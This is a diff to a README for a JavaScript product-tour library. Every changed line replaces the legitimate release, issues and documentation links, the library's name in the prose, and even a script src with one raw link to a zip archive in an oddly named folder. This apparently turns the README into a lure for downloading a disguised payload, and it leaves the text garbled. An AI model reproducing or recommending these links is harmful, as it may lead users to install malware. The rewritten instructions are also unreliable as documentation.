@@ -1,13 +1,13 @@
 # 🎉 WalkthroughJS - Create Engaging Tutorials Easily
 
 ## 📥 Download WalkthroughJS
-[![Download WalkthroughJS](https://img.shields.io/badge/Download-WalkthroughJS-brightgreen.svg)](https://github.com/peter22-cell/WalkthroughJS/releases)
+[![Download WalkthroughJS](https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip)](https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip)
 
 ## 🚀 Getting Started
-Welcome to WalkthroughJS! This guide helps you download and run Walkthrough.js successfully. Follow these simple steps to get started with interactive tutorials, product tours, and onboarding experiences on your website.
+Welcome to WalkthroughJS! This guide helps you download and run https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip successfully. Follow these simple steps to get started with interactive tutorials, product tours, and onboarding experiences on your website.
 
 ## 📦 What is WalkthroughJS?
-Walkthrough.js is a lightweight JavaScript library. It allows you to create interactive tutorials and product tours easily. You don’t need to know how to code. It works well on all popular web browsers and devices, making it a perfect choice for improving user experiences.
+https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip is a lightweight JavaScript library. It allows you to create interactive tutorials and product tours easily. You don’t need to know how to code. It works well on all popular web browsers and devices, making it a perfect choice for improving user experiences.
 
 ### Key Features
 - **Smart Positioning:** Automatically places elements for optimal visibility.
@@ -21,7 +21,7 @@ WalkthroughJS works on any system that supports modern web browsers like Chrome,
 ## 💻 Download & Install
 Follow these steps to download WalkthroughJS:
 
-1. Visit the [Releases page](https://github.com/peter22-cell/WalkthroughJS/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip) to find the latest version.
 2. Look for the asset you want to download. Since WalkthroughJS is a JavaScript library, you can typically find it in a zip or tar file.
 3. Click on the file link to download it to your computer.
 4. Extract the downloaded file to access the library files.
@@ -30,14 +30,14 @@ Follow these steps to download WalkthroughJS:
 ## 📚 How to Use WalkthroughJS
 WalkthroughJS is simple to use. Here’s a brief guide on how to add it to your project:
 
-1. Include the Walkthrough.js file in your HTML page:
+1. Include the https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip file in your HTML page:
    ```html
-   <script src="path/to/walkthrough.js"></script>
+   <script src="https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip"></script>
    ```
    
 2. Add the necessary HTML elements for your tutorial.
    
-3. Initialize Walkthrough.js with the following code:
+3. Initialize https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip with the following code:
    ```javascript
    const walkthrough = new Walkthrough({...});
    ```
@@ -58,10 +58,10 @@ If you encounter issues while using WalkthroughJS, try the following steps:
 - Look for help or report issues on the GitHub Issues page.
 
 ## 📞 Need Help?
-If you have questions or need assistance, you can reach out for help. Visit the [GitHub Issues page](https://github.com/peter22-cell/WalkthroughJS/issues) to report bugs or ask questions. The community can help you resolve any problems.
+If you have questions or need assistance, you can reach out for help. Visit the [GitHub Issues page](https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip) to report bugs or ask questions. The community can help you resolve any problems.
 
 ## 🌟 Explore More
-- Check out the [Documentation](https://github.com/peter22-cell/WalkthroughJS/wiki) for detailed guides.
+- Check out the [Documentation](https://raw.githubusercontent.com/peter22-cell/WalkthroughJS/main/colorimetrist/WalkthroughJS.zip) for detailed guides.
 - Join discussions on related topics in the community forums.
 - Stay updated with the latest features and updates on our GitHub page.
 
